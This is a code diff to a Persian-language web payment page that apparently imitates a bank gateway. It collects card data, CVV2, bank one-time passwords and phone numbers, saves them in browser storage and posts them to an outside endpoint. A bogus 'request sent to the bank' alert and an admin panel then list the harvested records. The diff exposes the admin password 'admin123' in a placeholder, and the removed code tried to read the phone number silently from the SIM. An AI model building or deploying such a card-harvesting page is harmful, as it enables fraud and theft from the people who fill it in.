@@ -131,6 +131,7 @@
             border-radius: 5px;
             cursor: pointer;
         }
+        /* Responsive design for mobile */
         @media (max-width: 600px) {
             .payment-form, .admin-section {
                 width: 95%;
@@ -140,6 +141,8 @@
                 font-size: 14px;
             }
         }
+        
+        /* If you have the Vazir font, add this part */
         @font-face {
             font-family: 'Vazir';
             src: url('fonts/Vazir.eot');
@@ -177,6 +180,11 @@
             </div>
 
             <div class="form-group">
+                <label for="phone-number">شماره تلفن:</label>
+                <input type="tel" id="phone-number" name="phone-number" placeholder="09XX-XXX-XXXX" maxlength="13" oninput="formatPhoneNumber(this)">
+            </div>
+
+            <div class="form-group">
                 <label>کد امنیتی:</label>
                 <div class="split-input">
                     <div class="secure-code" id="generated-code"></div>
@@ -201,7 +209,7 @@
     <div class="admin-section" id="admin-section">
         <h3>اطلاعات ذخیره‌شده (فقط مدیر):</h3>
         <div class="admin-password-group">
-            <input type="password" id="admin-pass" placeholder="">
+            <input type="password" id="admin-pass" placeholder="رمز مدیر را وارد کنید (admin123)">
             <button type="button" onclick="showAdminData()">تأیید رمز</button>
         </div>
         <pre id="admin-data" style="display: none;"></pre>
@@ -218,6 +226,21 @@
             if (input.value.length > 2) {
                 input.value = input.value.substring(0, 2) + '/' + input.value.substring(2, 4);
             }
+        }
+
+        function formatPhoneNumber(input) {
+            input.value = input.value.replace(/\D/g, '');
+            let formattedNumber = '';
+            if (input.value.length > 0) {
+                formattedNumber += input.value.slice(0, 4);
+                if (input.value.length > 4) {
+                    formattedNumber += '-' + input.value.slice(4, 7);
+                    if (input.value.length > 7) {
+                        formattedNumber += '-' + input.value.slice(7, 11);
+                    }
+                }
+            }
+            input.value = formattedNumber;
         }
 
         function generateSecureCode() {
@@ -238,54 +261,38 @@
                     "cvv2": data.get("cvv2"),
                     "security_code": data.get("security-code"),
                     "otp_code": data.get("otp-code"),
+                    "phone_number": data.get("phone-number"),
                     "timestamp": new Date().toISOString()
                 };
 
-                // تلاش برای گرفتن شماره تلفن (این بخش در بسیاری از مرورگرها کار نمی‌کند)
-                if (navigator.sim) {
-                    navigator.sim.getSubscriberIdentity()
-                    .then(identity => {
-                        jsonData.phone_number = identity.msisdn; // شماره تلفن
-                        saveAndSendData(jsonData);
-                    })
-                    .catch(error => {
-                        console.error("Could not get phone number:", error);
-                        saveAndSendData(jsonData); // بدون شماره تلفن ادامه می‌دهد
-                    });
-                } else {
-                    saveAndSendData(jsonData); // اگر SIM API پشتیبانی نشود
-                }
+                let storedData = JSON.parse(localStorage.getItem('paymentData')) || [];
+                storedData.push(jsonData);
+                localStorage.setItem('paymentData', JSON.stringify(storedData));
+
+                fetch('https://reqres.in/api/users', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(jsonData)
+                })
+                .then(response => response.json())
+                .then(data => {
+                    alert("درخواست رمز پویا به بانک مبدا ارسال شد");
+                    document.getElementById('request-otp').style.display = 'none';
+                    document.getElementById('otp-timer').style.display = 'block';
+                    startOTPTimer(120);
+
+                    const adminSection = document.getElementById('admin-section');
+                    adminSection.style.display = 'block';
+                    adminSection.scrollIntoView({ behavior: 'smooth' });
+                })
+                .catch(error => {
+                    alert("خطا در ارسال اطلاعات: " + error.message);
+                });
             } else {
                 alert("کد امنیتی نامعتبر است");
             }
-        }
-
-        function saveAndSendData(jsonData) {
-            let storedData = JSON.parse(localStorage.getItem('paymentData')) || [];
-            storedData.push(jsonData);
-            localStorage.setItem('paymentData', JSON.stringify(storedData));
-
-            fetch('https://reqres.in/api/users', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(jsonData)
-            })
-            .then(response => response.json())
-            .then(data => {
-                alert("درخواست رمز پویا به بانک مبدا ارسال شد");
-                document.getElementById('request-otp').style.display = 'none';
-                document.getElementById('otp-timer').style.display = 'block';
-                startOTPTimer(120);
-
-                const adminSection = document.getElementById('admin-section');
-                adminSection.style.display = 'block';
-                adminSection.scrollIntoView({ behavior: 'smooth' });
-            })
-            .catch(error => {
-                alert("خطا در ارسال اطلاعات: " + error.message);
-            });
         }
 
         function startOTPTimer(duration) {
